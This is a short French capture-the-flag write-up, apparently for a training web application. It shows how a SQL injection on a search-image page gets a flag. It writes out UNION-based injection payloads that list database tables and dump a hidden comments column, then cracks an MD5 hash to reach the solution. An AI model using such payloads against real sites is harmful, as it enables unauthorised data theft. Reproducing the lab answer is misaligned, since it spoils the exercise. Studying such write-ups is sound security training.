
Exploiter une injection SQL sur la page :

/index.php?page=searchimg

<img width="877" height="597" alt="image" src="https://github.com/user-attachments/assets/2ff977a1-7940-4951-b83d-31536ca4059b" />

<img width="724" height="640" alt="image" src="https://github.com/user-attachments/assets/575cc8ed-9ceb-4ca3-8e8d-2c8b43113315" />

afin de récupérer une valeur secrète à décoder, puis générer un SHA-256 qui constitue le flag.

On utilise information_schema.tables :

1 union all select 1,group_concat(table_name) from information_schema.tables where table_schema=database()

<img width="849" height="673" alt="image" src="https://github.com/user-attachments/assets/7f2b7ba1-13c6-4697-9c7e-324118f32876" />

Entre cette requête dans IMAGE NUMBER :

1 union all select 1,group_concat(comment,0x0a) from list_images

<img width="884" height="708" alt="image" src="https://github.com/user-attachments/assets/173d64bf-091a-4ec5-a3a6-86a8c940726f" />

Décrypter le MD5

Le hash :

1928e8083cf461a51303633093573c46

<img width="494" height="366" alt="image" src="https://github.com/user-attachments/assets/47425915-328e-4324-801f-5a67f9fb7129" />

Il ne reste plus qu’à générer le SHA-256 de albatroz en minuscule

<img width="1625" height="512" alt="image" src="https://github.com/user-attachments/assets/a5a4a8ca-a19e-47f2-a9e7-fc4c67445334" />








